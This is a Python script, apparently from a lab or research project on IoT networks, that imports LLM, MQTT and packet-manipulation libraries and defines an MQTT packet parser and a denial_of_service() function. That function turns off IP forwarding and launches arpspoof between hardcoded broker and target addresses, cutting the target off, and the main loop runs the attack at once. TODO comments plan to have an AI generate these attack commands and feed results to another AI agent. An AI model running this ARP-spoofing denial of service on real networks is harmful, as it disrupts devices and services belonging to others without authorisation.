import os
from urllib import response
import openai, threading
import json
import paho.mqtt.client as mqtt
from langchain.prompts import ChatPromptTemplate
from langchain_openai import ChatOpenAI
from scapy.all import *
import struct
import subprocess
import signal
import time
from netfilterqueue import NetfilterQueue
API_KEY = "Insert here"
openai.api_key = API_KEY
llm_model = "gpt-4"
targetIP = "192.168.8.207"
brokerIP = "192.168.8.210"
message = ""
sniffed_topic = ""
sniffed_message = ""
desired_payload = None
stop_flag = False
 
rec = False

def on_connect(client, userdata, flags, rc):
    print("connected")    
def on_message(client, userdata, msg):
    
    global rec
    global message
    
    print("Received Message: ", str(msg.payload.decode("utf-8")))
    rec = True
    message = str(msg.payload.decode("utf-8"))
    #message += '"""'
    #print (message)
    #print (rec)
    #print (message)
def mqtt_payload_parser(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extract topic
        message = payload[4+topic_len:].decode()  # Extract message
        return topic, message
    except Exception as e:
        return None, None       
                
'''
denial_of_service() - Method responsible for performing the denial of service attack.
'''
def denial_of_service():
    try:
        print("Performing Denial of Serivce Attack....")
        #TODO: Have AI generate this command
        os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
        #TODO: Have AI generate this command
        #Reroutes packets from the MQTT server through this computer.
        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", brokerIP, targetIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            time.sleep(5)
    #Kills the program when desired.
    except KeyboardInterrupt:
        print("Stopping DDOS process...")
        os.kill(nodeAttack.pid, signal.SIGTERM)

#TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).

try:
    while True: 
        denial_of_service()
        break

except KeyboardInterrupt:
    print("Stopping Attack....")

